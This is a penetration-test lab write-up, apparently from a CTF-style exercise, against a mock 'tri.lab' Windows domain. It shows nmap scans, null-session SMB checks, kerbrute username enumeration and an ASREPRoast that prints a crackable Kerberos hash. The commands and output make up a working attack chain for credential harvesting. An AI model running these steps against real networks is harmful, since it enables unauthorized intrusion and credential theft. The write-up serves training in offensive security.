# Triathlon

![](./screenshots/logo.png)

## Objective / Scope

An elite triathlon team from the United States has requested a penetration test on their internal network. They have granted access to their network via VPN, but no other information has been provided. Successful testers should prove full compromise by providing the NTLM hash for the "krbtgt" account.

## Enumeration

The attacker will start by organizing `hosts.txt`
```
10.0.27.33
10.0.16.22
10.0.18.230
```

Then utilizing the list the attack will scan them with nmap
```zsh
nmap -sV -T4 -p- -iL hosts.txt > scans.tcp

👤 rosskeddy 🏠 /work took 5m28s 
✦ ➜ cat scans.tcp   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-08 19:06 -0500
Nmap scan report for BIKE-SRV (10.0.27.33)
Host is up (0.027s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for RUN-SRV (10.0.16.22)
Host is up (0.027s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-09 00:11:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tri.lab, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tri.lab, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tri.lab, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tri.lab, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
54410/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54412/tcp open  msrpc         Microsoft Windows RPC
54422/tcp open  msrpc         Microsoft Windows RPC
54438/tcp open  msrpc         Microsoft Windows RPC
59583/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for SWIM-SRV (10.0.18.230)
Host is up (0.027s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49669/tcp open  msrpc         Microsoft Windows RPC
61386/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Anonymous auth was enabled but not fruitful, guest authentication was disabled.
```zsh
➜ nxc smb hosts.txt -u '' -p ''
SMB         10.0.16.22      445    RUN-SRV          [*] Windows Server 2022 Build 20348 x64 (name:RUN-SRV) (domain:tri.lab) (signing:True) (SMBv1:False) 
SMB         10.0.27.33      445    BIKE-SRV         [*] Windows Server 2022 Build 20348 x64 (name:BIKE-SRV) (domain:tri.lab) (signing:False) (SMBv1:False) 
SMB         10.0.18.230     445    SWIM-SRV         [*] Windows Server 2022 Build 20348 x64 (name:SWIM-SRV) (domain:tri.lab) (signing:False) (SMBv1:False) 
SMB         10.0.16.22      445    RUN-SRV          [+] tri.lab\: 
SMB         10.0.27.33      445    BIKE-SRV         [-] Broken Pipe Error while attempting to login
SMB         10.0.18.230     445    SWIM-SRV         [-] tri.lab\: STATUS_ACCESS_DENIED 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

👤 rosskeddy 🏠 /work took 25s 
➜ nxc smb hosts.txt -u 'ross' -p ''
SMB         10.0.18.230     445    SWIM-SRV         [*] Windows Server 2022 Build 20348 x64 (name:SWIM-SRV) (domain:tri.lab) (signing:False) (SMBv1:False) 
SMB         10.0.27.33      445    BIKE-SRV         [*] Windows Server 2022 Build 20348 x64 (name:BIKE-SRV) (domain:tri.lab) (signing:False) (SMBv1:False) 
SMB         10.0.16.22      445    RUN-SRV          [*] Windows Server 2022 Build 20348 x64 (name:RUN-SRV) (domain:tri.lab) (signing:True) (SMBv1:False) 
SMB         10.0.18.230     445    SWIM-SRV         [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.0.27.33      445    BIKE-SRV         [-] Broken Pipe Error while attempting to login
SMB         10.0.16.22      445    RUN-SRV          [-] tri.lab\ross: STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Through OSINT and having ChatGPT create a username list of the 2025 U.S. Elite Triathlon Team, the attacker utilizes [kerbrute](https://github.com/ropnop/kerbrute) and successfully gathers three valid usernames.
```zsh
➜ ~/tools/kerbrute userenum -d tri.lab potentials.txt --dc 10.0.16.22

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/08/26 - Ronnie Flathers @ropnop

2026/01/08 19:48:22 >  Using KDC(s):
2026/01/08 19:48:22 >   10.0.16.22:88

2026/01/08 19:48:22 >  [+] VALID USERNAME:       m.pearson@tri.lab
2026/01/08 19:48:22 >  [+] VALID USERNAME:       j.reed@tri.lab
2026/01/08 19:48:22 >  [+] VALID USERNAME:       t.spivey@tri.lab
2026/01/08 19:48:22 >  Done! Tested 72 usernames (3 valid) in 0.251 seconds
```

`users.txt`
```
m.pearson
j.reed
t.spivey
```

On BIKE-SRV the attacker gets a JavaScript alert upon loading the page.

![JavaScript alert on BIKE-SRV](./screenshots/1-goosepopup.png)

The attacker performs an ASREPRoast attack and it yields t.spivey's hash.
```zsh
➜ GetNPUsers.py 'tri.lab/' -usersfile users.txt -dc-ip 10.0.16.22                                              
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User m.pearson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.reed doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t.spivey@TRI.LAB:74353d39b62a2dcad65325164964d7e8$16787deeb9cf9b92db165e32da4f09ddaef3fdde5b94e8b0eb31b0c7116c1b3abfb245b708eaffdfaee967fa424dd941a14a8ec1ee12a78cf235a86c9c783adf9f6ed4612ccaa3d4a782e2b375719b18850af0eda8aabdb3d5e2b289f6cd086692167dc555e8a1e18f8a413bd0c8e0f72e9963d73c15c1b56844b94b841704e56c33299a94b8a993c249c1d0992d939492e493cf7ed354d8fadbc1fa83fc2c92ccb50b182fa1a5323b9a82363fc24eeb8940a1eb08b343808327fb605128896e6d2e56e8b208ac7d5ad6735e5d59ef169736223e647f5d850f1bf510e5b15fffb5dd
```

